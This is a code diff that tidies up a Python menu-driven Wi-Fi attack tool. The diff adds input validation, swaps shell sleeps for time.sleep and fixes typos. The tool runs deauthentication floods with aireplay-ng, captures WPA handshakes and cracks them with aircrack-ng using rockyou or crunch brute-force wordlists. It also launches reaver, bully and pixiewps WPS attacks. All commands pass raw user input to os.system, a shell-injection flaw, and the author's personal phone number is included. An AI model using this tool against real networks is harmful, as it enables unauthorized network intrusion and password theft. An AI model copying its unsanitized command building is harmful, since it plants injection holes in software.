@@ -3,11 +3,25 @@
 #!/usr/bin/env python
 import os
 import subprocess
+import time
 from subprocess import check_call
+
+def safe_input_int(prompt=""):
+    while True:
+        try:
+            val = input(prompt)
+            if not val.strip():
+                return 0
+            return int(val)
+        except ValueError:
+            print("\033[1;31mInvalid input! Please enter a valid number.\033[1;32m")
+
 print("\nInstalling Needed Tools")
 print("\n")
 cmd0 = os.system("apt-get install aircrack-ng crunch xterm wordlists reaver pixiewps bully xterm wifite")
-cmd  = os.system("sleep 3 && clear")
+time.sleep(3)
+os.system("clear")
+
 def intro():
     cmd  = os.system("clear")
     print("""\033[1;32m
@@ -36,8 +50,8 @@ def intro():
 (00)Exit
 -----------------------------------------------------------------------
 """)
-    print("\nEnter your choise here : !# ")
-    var = int(input(""))
+    print("\nEnter your choice here : !# ")
+    var = safe_input_int("")
     if var == 1 :
         print("\nEnter the interface:(Default(wlan0/wlan1))")
         interface = input("")
@@ -55,29 +69,29 @@ def intro():
         interface = input("")
         order = "airodump-ng {} -M".format(interface)
         print("When Done Press CTRL+c")
-        cmd = os.system("sleep 3")
+        time.sleep(3)
         geny  = os.system(order)
-        cmd = os.system("sleep 10")
+        time.sleep(10)
         intro()
     elif var == 4 :
         print("\nEnter the interface:(Default >>(wlan0mon/wlan1mon))")
         interface = input("")
         order     = "airodump-ng {} -M".format(interface)
         print("\nWhen Done Press CTRL+c")
-        print("\nNote: Under Probe it might be Passwords So copy them to the worlist file")
+        print("\nNote: Under Probe it might be Passwords So copy them to the wordlist file")
         print("\nDon't Attack The Network if its Data is ZERO (you waste your time)")
         print("\nyou Can use 's' to arrange networks")
-        cmd       = os.system("sleep 7")
+        time.sleep(7)
         geny      = os.system(order)
         print("\nEnter the bssid of the target?")
         bssid     = str(input(""))
         print("\nEnter the channel of the network?")
-        channel   = int(input())
+        channel   = safe_input_int()
         print("Enter the path of the output file ?")
         path = str(input(""))
         print("\nEnter the number of the packets [1-10000] ( 0 for unlimited number)")
         print("the number of the packets Depends on the Distance Between you and the network")
-        dist = int(input(""))
+        dist = safe_input_int("")
         order = "airodump-ng {} --bssid {} -c {} -w {} | xterm -e aireplay-ng -0 {} -a {} {}".format(interface,bssid,channel,path,dist,bssid,interface)
         geny = os.system(order)
         intro()
@@ -106,7 +120,7 @@ def intro():
 
 0)install all wireless tools
 """)
-            w = int(input("Enter The number of the tool : >>> "))
+            w = safe_input_int("Enter The number of the tool : >>> ")
             if w == 1 :
                 cmd = os.system("sudo apt-get update && apt-get install aircrack-ng")
             elif w == 90:
@@ -190,7 +204,7 @@ you can find on Instagram
 
 https://www.instagram.com/anddyyyy_08/
 
-Contack me +91 8374763014
+Contact me +91 8374763014
 
 Feel Free to Contact,
 
@@ -205,7 +219,7 @@ Feel Free to Contact,
             order = "aircrack-ng {} -w /usr/share/wordlists/rockyou.txt".format(path)
             print("\nTo exit Press CTRL +C")
             geny  = os.system(order)
-            sleep = os.system("sleep 5d")
+            input("\nPress Enter to exit...")
             exit()
         elif os.path.exists("/usr/share/wordlists/rockyou.txt")==False:
             cmd = os.system("gzip -d /usr/share/wordlists/rockyou.txt.gz")
@@ -214,7 +228,7 @@ Feel Free to Contact,
             order = "aircrack-ng {} -w /usr/share/wordlists/rockyou.txt".format(path)
             print("\nTo exit Press CTRL +C")
             geny  = os.system(order)
-            sleep = os.system("sleep 5d")
+            input("\nPress Enter to exit...")
             exit()
     elif var == 7 :
         print("\nEnter the path of the handshake file ?")
@@ -230,9 +244,9 @@ Feel Free to Contact,
         print("\nEnter the path of the handshake file ?")
         path = str(input(""))
         print("\nEnter the minimum length of the password (8/64)?")
-        mini = int(input(""))
+        min_len = safe_input_int("")
         print("\nEnter the maximum length of the password (8/64)?")
-        max  = int(input(""))
+        max_len = safe_input_int("")
         print("""
 ---------------------------------------------------------------------------------------
 (1)  Lowercase chars                                 (abcdefghijklmnopqrstuvwxyz)
@@ -250,89 +264,89 @@ Feel Free to Contact,
 -----------------------------------------------------------------------------------------
 Crack Password Could Take Hours,Days,Weeks,Months to complete
 and the speed of cracking will reduce because you generate a Huge,Huge Passwordlist
-may reach to Hundreds of TeRa Bits so Be patiant
+may reach to Hundreds of Terabits so Be patient
 """)
-        print("\nEnter your choise here : ?")
-        set = str(input(""))
-        if set == "1":
+        print("\nEnter your choice here : ?")
+        set_choice = str(input(""))
+        if set_choice == "1":
             test = str("abcdefghijklmnopqrstuvwxyz")
-            order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,max,test,path,essid)
+            order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(min_len,max_len,test,path,essid)
             geny  = os.system(order)
-        elif set == "2":
+        elif set_choice == "2":
             test = str("ABCDEFGHIJKLMNOPQRSTUVWXYZ")
-            order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,max,test,path,essid)
+            order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(min_len,max_len,test,path,essid)
             geny  = os.system(order)
-        elif set == "3":
+        elif set_choice == "3":
             test = str("0123456789")
-            order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,max,test,path,essid)
+            order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(min_len,max_len,test,path,essid)
             geny  = os.system(order)
-        elif set == "4":
+        elif set_choice == "4":
             test = str("!#$%/=?{}[]-*:;")
-            order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,max,test,path,essid)
+            order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(min_len,max_len,test,path,essid)
             geny  = os.system(order)
-        elif set == "5":
+        elif set_choice == "5":
             test = str("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
-            order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,max,test,path,essid)
+            order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(min_len,max_len,test,path,essid)
             geny  = os.system(order)
-        elif set == "6":
+        elif set_choice == "6":
             test = str("abcdefghijklmnopqrstuvwxyz0123456789")
-            order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,max,test,path,essid)
+            order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(min_len,max_len,test,path,essid)
             geny  = os.system(order)
-        elif set == "7":
+        elif set_choice == "7":
             test = str("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
-            order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,max,test,path,essid)
+            order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(min_len,max_len,test,path,essid)
             geny  = os.system(order)
-        elif set == "8":
+        elif set_choice == "8":
             test = str("!#$%/=?{}[]-*:;0123456789")
-            order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,max,test,path,essid)
+            order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(min_len,max_len,test,path,essid)
             geny  = os.system(order)
-        elif set == "9":
+        elif set_choice == "9":
             test = str("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
-            order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,max,test,path,essid)
+            order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(min_len,max_len,test,path,essid)
             geny  = os.system(order)
-        elif set == "10":
+        elif set_choice == "10":
             test = str("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%/=?{}[]-*:;")
-            order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,max,test,path,essid)
+            order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(min_len,max_len,test,path,essid)
             geny  = os.system(order)
-        elif set == "11":
+        elif set_choice == "11":
             test = str("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!#$%/=?{}[]-*:;")
-            order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,max,test,path,essid)
+            order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(min_len,max_len,test,path,essid)
             geny  = os.system(order)
-        elif set == "12":
+        elif set_choice == "12":
             print("Enter you Own Words and numbers")
             test  = str(input(""))
-            order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,max,test,path,essid)
+            order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(min_len,max_len,test,path,essid)
             geny  = os.system(order)
         else:
             print("\nNot Found")
             intro()
         print("Copy the Password and Close the tool")
-        cmd5 = os.system("sleep 3d")
+        input("\nPress Enter to exit...")
     elif var == 9 :
         print("\nEnter the minimum length of the password (8/64)?")
-        mini = int(input(""))
+        min_len = safe_input_int("")
         print("\nEnter the maximum length of the password (8/64)?")
-        max  = int(input(""))
+        max_len = safe_input_int("")
         print("\nEnter the path of the output file?")
         path = str(input(""))
         print("\nEnter what you want the password contain ?")
         password = str(input(""))
-        order = ("crunch {} {} {} -o {}").format(mini,max,password,path)
+        order = ("crunch {} {} {} -o {}").format(min_len,max_len,password,path)
         geny = os.system(order)
-        a = ("The wordlist in >>>>> {} Named as SRART").format(path)
+        a = ("The wordlist in >>>>> {} Named as START").format(path)
         print(a)
     elif var == 10:
         cmd = os.system("clear")
         print("""
 1)Reaver
 2)Bully
-3)wifite (Recommeneded)
+3)wifite (Recommended)
 4)PixieWps
 
 0) Back to Main Menu
 """)
         print("Choose the kind of the attack(External WIFI Adapter Require) ?")
-        attack = int(input(""))
+        attack = safe_input_int("")
         if attack == 1:
             print("\nEnter the interface to start ?(Default(Wlan0mon/Wlan1mon))")
             interface = str(input(""))
@@ -347,7 +361,7 @@ may reach to Hundreds of TeRa Bits so Be patiant
             print("\nEnter the bssid of the network ?")
             bssid = str(input(""))
             print("\nEnter the channel of the network ?")
-            channel = int(input(""))
+            channel = safe_input_int("")
             order = ("bully -b {} -c {} --pixiewps {}").format(bssid,channel,interface)
             geny = os.system(order)
             intro()
@@ -369,10 +383,10 @@ may reach to Hundreds of TeRa Bits so Be patiant
         interface = str(input(""))
         order = "airodump-ng -M --wps {}".format(interface)
         geny = os.system(order)
-        cmd = os.system("sleep 5 ")
+        time.sleep(5)
         intro()
     else:
         print("Not Found")
-        cmd = os.system("sleep 2")
+        time.sleep(2)
         intro()
 intro()
